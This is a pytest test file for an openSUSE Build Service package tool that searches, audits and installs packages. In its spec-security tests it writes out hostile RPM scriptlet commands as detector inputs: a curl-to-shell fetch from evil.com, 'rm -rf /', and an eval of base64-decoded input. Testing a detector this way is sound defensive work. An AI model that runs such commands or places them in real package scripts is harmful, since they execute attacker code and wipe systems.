# SPDX-License-Identifier: GPL-3.0-only OR MIT
"""
Tests for suse_ops_server.obs module. Zero real network calls.
"""

from unittest.mock import AsyncMock, MagicMock, patch

import httpx
import pytest

from suse_ops_server.obs import (
    search_obs,
    get_obs_info,
    get_spec_file,
    analyze_spec_security,
    audit_obs_package,
    install_obs_package,
)
from obs_stub import (
    SEARCH_XML,
    METADATA_XML,
    SPEC_CONTENT,
    DANGEROUS_SPEC_CONTENT,
)


def _make_response(status_code=200, text=""):
    mock = MagicMock()
    mock.status_code = status_code
    mock.text = text
    mock.raise_for_status = MagicMock()
    if status_code >= 400:
        mock.raise_for_status.side_effect = httpx.HTTPStatusError(
            f"HTTP {status_code}", request=MagicMock(), response=mock
        )
    return mock


class TestSearchObs:
    @pytest.mark.asyncio
    async def test_search_success(self):
        with patch("httpx.AsyncClient") as mock_client:
            mock_client.return_value.__aenter__.return_value.get = AsyncMock(
                return_value=_make_response(200, SEARCH_XML)
            )
            result = await search_obs("vim")
            assert result["count"] == 1
            assert result["packages"][0]["name"] == "vim"
            assert result["packages"][0]["project"] == "openSUSE:Factory"

    @pytest.mark.asyncio
    async def test_search_timeout(self):
        with patch("httpx.AsyncClient") as mock_client:
            mock_client.return_value.__aenter__.return_value.get = AsyncMock(
                side_effect=httpx.TimeoutException("timeout")
            )
            result = await search_obs("vim")
            assert result["error"] is True
            assert result["type"] == "TimeoutError"

    @pytest.mark.asyncio
    async def test_search_http_error(self):
        resp = _make_response(503)
        with patch("httpx.AsyncClient") as mock_client:
            mock_client.return_value.__aenter__.return_value.get = AsyncMock(
                side_effect=httpx.HTTPStatusError("error", request=MagicMock(), response=resp)
            )
            result = await search_obs("vim")
            assert result["error"] is True
            assert result["type"] == "HTTPError"

    @pytest.mark.asyncio
    async def test_search_empty_results(self):
        empty_xml = '<?xml version="1.0"?><collection matches="0"></collection>'
        with patch("httpx.AsyncClient") as mock_client:
            mock_client.return_value.__aenter__.return_value.get = AsyncMock(
                return_value=_make_response(200, empty_xml)
            )
            result = await search_obs("nonexistent")
            assert result["count"] == 0
            assert result["packages"] == []


class TestGetObsInfo:
    @pytest.mark.asyncio
    async def test_get_info_success(self):
        with patch("httpx.AsyncClient") as mock_client:
            mock_client.return_value.__aenter__.return_value.get = AsyncMock(
                return_value=_make_response(200, METADATA_XML)
            )
            result = await get_obs_info("vim")
            assert result["package"] == "vim"
            assert result["project"] == "openSUSE:Factory"
            assert "vim" in result["metadata"]

    @pytest.mark.asyncio
    async def test_get_info_not_found(self):
        resp = _make_response(404)
        with patch("httpx.AsyncClient") as mock_client:
            mock_client.return_value.__aenter__.return_value.get = AsyncMock(
                side_effect=httpx.HTTPStatusError("not found", request=MagicMock(), response=resp)
            )
            result = await get_obs_info("nonexistent")
            assert result["error"] is True
            assert result["type"] == "NotFound"

    @pytest.mark.asyncio
    async def test_get_info_timeout(self):
        with patch("httpx.AsyncClient") as mock_client:
            mock_client.return_value.__aenter__.return_value.get = AsyncMock(
                side_effect=httpx.TimeoutException("timeout")
            )
            result = await get_obs_info("vim")
            assert result["error"] is True
            assert result["type"] == "TimeoutError"


class TestGetSpecFile:
    @pytest.mark.asyncio
    async def test_get_spec_success(self):
        with patch("httpx.AsyncClient") as mock_client:
            mock_client.return_value.__aenter__.return_value.get = AsyncMock(
                return_value=_make_response(200, SPEC_CONTENT)
            )
            result = await get_spec_file("vim")
            assert result["package"] == "vim"
            assert "Name:" in result["spec_content"]

    @pytest.mark.asyncio
    async def test_get_spec_not_found(self):
        resp = _make_response(404)
        with patch("httpx.AsyncClient") as mock_client:
            mock_client.return_value.__aenter__.return_value.get = AsyncMock(
                side_effect=httpx.HTTPStatusError("not found", request=MagicMock(), response=resp)
            )
            result = await get_spec_file("nonexistent")
            assert result["error"] is True
            assert result["type"] == "NotFound"

    @pytest.mark.asyncio
    async def test_get_spec_timeout(self):
        with patch("httpx.AsyncClient") as mock_client:
            mock_client.return_value.__aenter__.return_value.get = AsyncMock(
                side_effect=httpx.TimeoutException("timeout")
            )
            result = await get_spec_file("vim")
            assert result["error"] is True
            assert result["type"] == "TimeoutError"


class TestAnalyzeSpecSecurity:
    def test_safe_spec(self):
        result = analyze_spec_security(SPEC_CONTENT)
        assert result["has_risks"] is False
        assert result["risk_count"] == 0

    def test_dangerous_spec(self):
        result = analyze_spec_security(DANGEROUS_SPEC_CONTENT)
        assert result["has_risks"] is True
        assert result["risk_count"] > 0
        descriptions = [r["description"] for r in result["risks"]]
        assert any("shell" in d.lower() or "base64" in d.lower() or "root" in d.lower() for d in descriptions)

    def test_curl_pipe_sh(self):
        spec = "%pre\ncurl https://evil.com/x.sh | sh\n%files\n"
        result = analyze_spec_security(spec)
        assert result["has_risks"] is True
        assert any("curl" in r["description"].lower() or "shell" in r["description"].lower() for r in result["risks"])

    def test_rm_rf_root(self):
        spec = "%pre\nrm -rf /tmp\n%post\nrm -rf /\n%files\n"
        result = analyze_spec_security(spec)
        assert result["has_risks"] is True

    def test_eval_base64(self):
        spec = "%pre\neval $(echo abc | base64 -d)\n%files\n"
        result = analyze_spec_security(spec)
        assert result["has_risks"] is True

    def test_empty_spec(self):
        result = analyze_spec_security("")
        assert result["has_risks"] is False


class TestAuditObsPackage:
    @pytest.mark.asyncio
    async def test_audit_safe_package(self):
        with patch("httpx.AsyncClient") as mock_client:
            mock_client.return_value.__aenter__.return_value.get = AsyncMock(
                return_value=_make_response(200, SPEC_CONTENT)
            )
            result = await audit_obs_package("vim")
            assert result["package"] == "vim"
            assert result["security"]["has_risks"] is False

    @pytest.mark.asyncio
    async def test_audit_dangerous_package(self):
        with patch("httpx.AsyncClient") as mock_client:
            mock_client.return_value.__aenter__.return_value.get = AsyncMock(
                return_value=_make_response(200, DANGEROUS_SPEC_CONTENT)
            )
            result = await audit_obs_package("malicious-pkg")
            assert result["security"]["has_risks"] is True
            assert "CAUTION" in result["recommendation"]

    @pytest.mark.asyncio
    async def test_audit_spec_not_found(self):
        resp = _make_response(404)
        with patch("httpx.AsyncClient") as mock_client:
            mock_client.return_value.__aenter__.return_value.get = AsyncMock(
                side_effect=httpx.HTTPStatusError("not found", request=MagicMock(), response=resp)
            )
            result = await audit_obs_package("nonexistent")
            assert result["error"] is True


class TestInstallObsPackage:
    @pytest.mark.asyncio
    async def test_install_standard(self):
        with (
            patch("suse_ops_server.obs.IS_IMMUTABLE", False),
            patch("suse_ops_server.obs.run_command") as mock_run,
        ):
            mock_run.return_value = (0, "vim installed\n", "")
            result = await install_obs_package("vim")
            assert result["installed"] is True
            assert result["package"] == "vim"
            # Should use zypper
            cmd = mock_run.call_args[0][0]
            assert "zypper" in cmd

    @pytest.mark.asyncio
    async def test_install_immutable(self):
        with (
            patch("suse_ops_server.obs.IS_IMMUTABLE", True),
            patch("suse_ops_server.obs.run_command") as mock_run,
        ):
            mock_run.return_value = (0, "vim installed\n", "")
            result = await install_obs_package("vim")
            assert result["installed"] is True
            # Should use transactional-update
            cmd = mock_run.call_args[0][0]
            assert "transactional-update" in cmd

    @pytest.mark.asyncio
    async def test_install_failure(self):
        with (
            patch("suse_ops_server.obs.IS_IMMUTABLE", False),
            patch("suse_ops_server.obs.run_command") as mock_run,
        ):
            mock_run.return_value = (1, "", "package not found")
            result = await install_obs_package("nonexistent")
            assert result["error"] is True
